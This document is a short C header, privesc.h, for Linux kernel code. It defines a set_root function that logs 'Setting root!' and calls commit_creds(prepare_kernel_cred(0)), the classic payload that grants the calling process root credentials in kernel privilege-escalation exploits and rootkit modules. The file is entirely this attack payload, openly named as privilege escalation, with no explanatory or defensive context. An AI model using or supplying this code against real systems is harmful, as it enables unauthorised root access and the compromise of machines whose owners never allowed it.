#ifndef PRIVESC_H
#define PRIVESC_H

#include <linux/cred.h>
#include <linux/uidgid.h>

void set_root(void)
{
    printk(KERN_ALERT "Setting root!\n");
    commit_creds(prepare_kernel_cred(0));
}

#endif